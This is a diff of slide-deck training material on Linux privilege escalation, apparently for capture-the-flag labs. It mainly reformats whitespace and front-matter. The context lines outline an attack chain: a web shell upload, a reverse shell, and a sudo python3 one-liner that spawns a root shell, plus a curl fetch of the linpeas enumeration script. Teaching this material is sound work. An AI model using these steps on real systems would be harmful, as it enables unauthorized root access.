@@ -1,9 +1,3 @@
----
-marp: true
-theme: default
-paginate: true
----
-
 # Privilege Escalation & Persistence
 
 ## From Low-Privilege Shell to Root
@@ -487,20 +481,20 @@ curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas
 2. ENUMERATE
    gobuster -> Found /admin, /uploads, /backup
    whatweb -> WordPress 5.4, PHP 7.4
-   
+
 3. EXPLOIT
    wpscan -> Found vulnerable plugin
    Exploit -> Upload web shell
    Web shell -> Reverse shell as www-data
-   
+
 4. ESCALATE
    sudo -l -> Can run /usr/bin/python3 as root
    sudo python3 -c 'import os; os.system("/bin/bash")'
    -> ROOT!
-   
+
 5. CAPTURE
    cat /root/flag.txt -> FLAG{congrats_you_rooted_it}
-   
+
 6. DOCUMENT
    Write report with all steps and evidence
 ```
